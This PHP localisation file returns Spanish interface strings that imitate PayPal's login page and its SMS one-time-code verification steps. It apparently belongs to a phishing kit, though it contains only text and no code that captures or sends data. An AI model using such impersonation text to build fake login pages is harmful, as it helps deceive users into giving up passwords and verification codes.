<?php

function lang($phrase){
    static $lang = array(
        '1' => 'Inicia sesión en tu cuenta de PayPal',
        '2' => 'Correo electrónico o número de móvil',
        '3' => 'Contraseña',
        '4' => '¿Olvidaste tu contraseña',
        '5' => 'Iniciar sesión',
        '6' => 'o',
        '7' => 'Regístrate',
        '8' => 'Inglés',
        '9' => 'Francés',
        '10' => 'Español',
        '11' => '文',
        '12' => 'Verificación de seguridad rápida',
        '13' => 'Solo necesitamos información adicional para confirmar que eres tú.',
        '14' => 'Recibir un mensaje de texto',
        '15' => 'Al continuar, confirmas que estás autorizado para usar este número de teléfono y aceptas recibir mensajes de texto para confirmar tu identidad en esta sesión. Pueden aplicarse tarifas del operador. Podemos recibir detalles del abonado y del dispositivo de tu operador inalámbrico para usarlos con fines de riesgo y fraude.',
        '16' => 'Siguiente',
        '17' => 'Escribe tu código',
        '18' => 'Reenviar',
        '19' => 'Continuar',
        '20' => 'Contáctanos',
        '21' => 'Privacidad',
        '22' => 'Legal',
        '23' => 'Actualizaciones de la política',
        '24' => 'En todo el mundo',
        '25' => 'Código no válido. Te hemos enviado un nuevo código.',
    );

    return $lang[$phrase];
}
?>
